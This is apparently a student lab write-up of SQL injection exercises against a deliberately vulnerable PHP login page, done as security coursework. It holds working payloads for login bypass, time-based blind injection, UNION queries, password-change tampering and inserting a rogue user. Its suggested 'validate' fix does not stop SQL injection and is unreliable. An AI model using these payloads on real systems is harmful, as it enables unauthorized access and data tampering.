### Exercise 2:
__1Q :__  Identify a mechanism which protects the login process (not on the server) and
briefly describe the general security problem with this implementation.
__1:__ 
-   The client side script restricts the user input to avoid any kind of injection or malicious payload that can be entered through the input form.
The following check is responsible for validation:


```javascript
function checkform() {
	loginform = document.loginForm;
	if (loginform) {
		var username = loginform.username.value;
		if (username.match("[^a-zA-Z0-9]")) {
			// something is wrong
			alert('Error: The username only allows letters and numbers as valid characters!');
			return false;
		} else {
			var password = loginform.password.value;
			if (password.match("[^a-zA-Z0-9]")) {
				// something else is wrong
				alert('Error: The password only allows letters and numbers as valid characters!');
				return false;
			}
		}
		document.loginForm.submit();
		return true;
	}
	return false;

```   

<img src="https://raw.githubusercontent.com/shashihacks/oscp-new/master/Security%20Insider%20Lab-2/assets/input_validation.PNG?token=AD4TE5YM74T5AHJZAHM7CXTASDXZM" alt="input_validation">


__Security problem :__
- Client can disable javascript to avoid validation, which can cause the application to allow  malicious payload and bypass the restriction imposed by the application
- The payload is sent using GET request (which can be observed from network tab)

```php
GET /htdocs/login.php?username=alex&password=test123
```

The above request can be captured and replayed without the need to enter the input in the form, which bypasses the imposed restriction



__2.__ 
    - __Step 1:__ capture the URL on login page submit
    - __Step 2:__ modify the parameters (`username` and `password`) and submit through   browser or web proxy(in our case- ___burpsuite___)
    - __Step 3:__ send the request from the burpsuite and reload the page.
    - Payload used:  

```php
/htdocs/login.php?username=alex'%23&password=test123
```
> `%23` represents `#` to comment the succeding parameters


![validation-bypass](https://raw.githubusercontent.com/shashihacks/oscp-new/master/Security%20Insider%20Lab-2/assets/validation_bypass.PNG?token=AD4TE53ABTNEZCNJDB4SXJ3ASECMC)

3. __Better solution:__
    - Validate the user input on the server side and return if input is other than the whitelisted characters  or use the mysql

    __Replace:__
    ```php
    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];
    ```


    __with:__  

    ```php
    $username = validate($_REQUEST['username']); 
    $password = validate($_REQUEST['password']); 

    function validate($data) {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }
    ```

however same validation used on client side can also be used.


### Exercise 3: SQL Injection

__1. Find a query to enter the system (without manipulating the data used by the
web application, you should get access on behalf of another user). Show this
query and briefly explain it using the source code at hand.__

__Solution:__

```
GET /htdocs/login.php?username=a&password=test'%20or%20'1'='1 HTTP/1.1

GET /htdocs/login.php?username=alex' or '1'='1' #&password=tes
```

> __Note:__ URL encode the payload to combine with the request  
> The second request, the password part is commented



__2. Fire your attack…!!!
Why is your attack successful? & which checks and mechanisms can prevent this
failure (mention at least two mechanisms).__
__Solution:__


__3. Change the password of the user you are logged in with. Briefly describe your
actions and indicate the source code allowing for this attack.__
__Solution:__
**step 1**: find the page that is responsible for password change
    
```bash 
    $ grep -Ril "not changed"                              
    htbchgpwd.page
```  

**step 2:** Find query responsible for password change
```php

    $sql="SELECT ".$htbconf['db/users.password']." FROM ".$htbconf['db/users']." where ". $htbconf['db/users.id']."='".$_SESSION['userid']."' and ". $htbconf['db/users.password']."='".$http['oldpwd']."'";
```
 - query used to exploit (payload is part of form data)
 - Exploited using blind sql same way as in login page
 ```php
    oldpwd=test'%20or%20'1'='1&newpwd1=test123&newpwd2=test123&submit=Submit
 ```



### Exercise 3 
following query works
```php
GET /htdocs/login.php?username=alex&password=test'%20or%20sleep%285%29%23
```

works
select * from users WHERE username='alex' or 1=1 UNION select 1,2,3,4,5,6,7,8

- ```GET /htdocs/login.php?username=test'%20or%20exists(SELECT%201%20%20FROM%20users%20limit%201)%23&password=asd ```
when `db_users` is used user doesn;t login
```
GET /htdocs/login.php?username=test' or exists(SELECT 1  FROM users limit 1)#&password=asd 
```

- the following query works for union selec
```php
GET /htdocs/login.php?username=alex' or '1'='1 UNION select 1,2,3,4,5,6,7,8#&password=asd
```

- following query works to insert username and password
```sql
SELECT * FROM `users` WHERE username="alex" ; INSERT INTO users(id, username, password) VALUES(77,"metest", "metest")
```

- query used to insert values
```php
GET /htdocs/login.php?username=alex'%3B%20INSERT%20INTO%20users(id%2C%20username%2C%20password)%20VALUES(77%2C%22metest%22%2C%20%22metest%22)%23&password=asd
```
<br></br><br></br><br></br><br></br><br></br><br></br><br></br>
    
        
